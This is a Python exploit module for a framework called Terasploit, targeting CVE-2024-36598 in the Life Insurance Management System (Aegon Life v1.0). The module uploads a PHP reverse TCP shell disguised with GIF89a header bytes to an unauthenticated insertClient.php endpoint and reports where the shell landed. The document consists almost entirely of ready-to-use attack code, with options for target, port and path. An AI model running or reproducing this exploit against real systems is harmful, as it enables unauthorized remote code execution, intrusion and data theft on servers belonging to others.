#######
# Module/Exploit: Life Insurance Management System Unauthenticated RCE
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitExploit(Exploit):
    
    module_type = 'exploit'
    payload = 'modules/payload/php/multi/reverse_tcp'
    encoder = None
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'exploit',
                'Name' : 'Life Insurance Management System Unauthenticated RCE',
                'Module Author' : 'Handler4',
                'Exploit Author' : 'Aslam Anwar Mahimkar',
                'Version' : 'Aegon Life v1.0',
                'CVE' : 'CVE-2024-36598',
                'Exploit-db' : 'https://www.exploit-db.com/exploits/52045',
                
                'Description' : [
                    'An arbitrary file upload vulnerability in Aegon Life v1.0',
                    'allows attackers to execute arbitrary code via uploading a ',
                    'crafted PHP file by adding image/gif bytes in payload.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptPort.new('rport',opt=[80,'yes','target port (tcp)']),
            OptString.new('path','none',['/farm/','yes','url path to attempt the upload']),
        ])


    def exploit(self) -> tuple[str, bool]: 
        target = self.GetOPT('target')
        rport = self.GetOPT('rport')
        path = self.GetOPT('path')
        shell = self.EncodeShell(self.encoder,self.payload.shell_content())
    
        scheme, hostname = self.ParseTarget(target,return_list=['scheme','hostname'])
        rand = self.RandomName()

        url = f"{scheme}://{hostname}:{rport}/{path.rstrip('/').lstrip('/')}"
        exploit_url = f'{url}/insertClient.php'
        
        shell_url = f'{url}/uploads/{rand}.php'
        Shell(shell_url).new()

        payload = f"GIF89a;'{shell}'"
        file = {'fileToUpload': (rand + '.php', payload, 'text/php')}

        try:
            exploit = HTTPClient.Request('post',url=exploit_url,files=file,data={'agent_id':''},verify=False)
            if exploit.status_code in self.good_status_code():
                info_print (f'Status code: {exploit.status_code}')
                info_print (f'Shell uploaded: {shell_url}')
                return 'session', True
            else:
                info_print ('Exploit failed.',type='red')
                info_print (f'Status code: {exploit.status_code}')
                return 'session', False
            
        except Exception as error:
            info_print (error,type='red')
            return 'exception', True

